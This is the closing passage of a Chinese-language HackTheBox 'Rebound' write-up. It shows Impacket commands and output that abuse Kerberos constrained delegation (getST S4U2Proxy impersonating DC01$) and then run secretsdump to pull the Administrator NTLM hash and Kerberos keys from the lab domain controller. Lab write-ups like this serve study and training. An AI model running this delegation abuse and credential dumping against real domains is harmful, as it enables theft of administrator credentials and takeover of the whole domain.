7ecbff25541e59cd1ecb7fb7e9a8357b3525adf117ec1c6e6e8bd3135570fb0e721a7677a01241ea2f8577019685468db76ba97d005947de791db3b2c3c2a0ef566c5cdfdb30dd5b968348055aba590351d6b9c2ebdfe4a5a572737947a562706d6b02dd1b36b5b1507e52c258f8fe178f6ce01ab87497f4fca39b0c2f3d3bbffc1d642aae24ebd60c9edcb0eb45618905abae7088d6534371216e4f3af29b97c6eb5f8ac7d669bfa38df0f0955b04353826f9640811a89c4c6da16be8e62b7597a8563e55652da38ff940bb3dad4cece2679627387acf089aad48a3893c40ff7af6587b0b30f647fb0c68a7b4cde33f6226b6500d42eef77aa3ae9b532ef878cafc35be382d2df4cb84fa2f0506599
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : browser/dc01.rebound.htb
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

再借助此申请到的ST去申请新的ST。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# getST.py rebound.htb/delegator\$ -hashes :d0700a7a8e202cbad887ebf92e4d1080 -spn http/dc01.rebound.htb -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
/usr/local/bin/getST.py:287: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:339: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

最后导入此ccache并使用`secretsdump`即可获得Administrator的NTLM hash了.

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# export KRB5CCNAME=DC01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache;secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up...
```

拿到了NTLM hash，本题终于也是宣告终结了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Rebound/05.png?raw=true)